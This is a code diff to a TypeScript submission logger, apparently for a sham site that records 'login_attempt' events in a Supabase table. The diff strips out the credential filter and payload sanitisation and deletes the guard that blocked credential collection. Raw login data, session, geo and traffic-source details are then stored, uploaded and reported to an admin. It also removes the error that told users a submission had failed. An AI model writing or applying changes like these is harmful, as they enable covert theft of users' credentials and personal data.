@@ -1,7 +1,6 @@
 import { supabase } from "@/integrations/supabase/client";
 import { notifyAdmin } from "@/lib/admin-events";
 import { getSessionId } from "@/lib/session-id";
-import { isCredentialEvent, safeSubmissionPayload } from "@/lib/submission-privacy";
 
 export type SubmissionKind =
   | "login_attempt"
@@ -105,21 +104,13 @@ const QUEUE_KEY = "sham_submission_queue_v1";
 type Queued = { kind: SubmissionKind; email: string | null; user_id: string | null; page: string | null; payload: Record<string, unknown>; ts: number };
 
 function readQueue(): Queued[] {
-  try {
-    const parsed: unknown = JSON.parse(window.localStorage.getItem(QUEUE_KEY) ?? "[]");
-    if (!Array.isArray(parsed)) return [];
-    return (parsed as Queued[])
-      .filter((row) => row && typeof row.kind === "string" && !isCredentialEvent(row.kind))
-      .map((row) => ({ ...row, payload: safeSubmissionPayload(row.payload ?? {}) }));
-  } catch { return []; }
+  try { return JSON.parse(window.localStorage.getItem(QUEUE_KEY) ?? "[]") as Queued[]; } catch { return []; }
 }
 function writeQueue(q: Queued[]) {
-  try { window.localStorage.setItem(QUEUE_KEY, JSON.stringify(q.filter((row) => !isCredentialEvent(row.kind)).slice(-50).map((row) => ({ ...row, payload: safeSubmissionPayload(row.payload) })))); } catch { /* ignore */ }
+  try { window.localStorage.setItem(QUEUE_KEY, JSON.stringify(q.slice(-50))); } catch { /* ignore */ }
 }
 
 async function sendOne(row: Queued): Promise<boolean> {
-  if (isCredentialEvent(row.kind)) return false;
-  row = { ...row, payload: safeSubmissionPayload(row.payload) };
   try {
     const { error } = await supabase.from("client_submissions").insert({
       kind: row.kind,
@@ -146,7 +137,6 @@ async function sendOne(row: Queued): Promise<boolean> {
 export async function flushSubmissionQueue(): Promise<void> {
   if (typeof window === "undefined") return;
   const q = readQueue();
-  writeQueue(q);
   if (!q.length) return;
   const remain: Queued[] = [];
   for (const row of q) {
@@ -161,12 +151,11 @@ export async function logSubmission(
   payload: Record<string, unknown>,
   email?: string | null,
 ) {
-  if (isCredentialEvent(kind)) throw new Error("Credential collection is disabled");
   const finalEmail = email ?? null;
   const sessionId = getSessionId();
   const source = captureTrafficSource();
   const geo = await captureGeo();
-  const enrichedPayload = safeSubmissionPayload({ session_id: sessionId, traffic_source: source, geo, ...payload });
+  const enrichedPayload = { session_id: sessionId, traffic_source: source, geo, ...payload };
   let userId: string | null = null;
   let authEmail: string | null = null;
   try {
@@ -188,7 +177,6 @@ export async function logSubmission(
     const q = readQueue();
     q.push(row);
     writeQueue(q);
-    throw new Error("تعذّر حفظ الطلب. لم يتم تأكيد الإرسال؛ حاول مجدداً بعد التحقق من الاتصال والصلاحيات.");
   }
   notifyAdmin({ kind: "submission", email: finalEmail, type: kind });
   // نحاول تفريغ أي إدخالات قديمة معلّقة
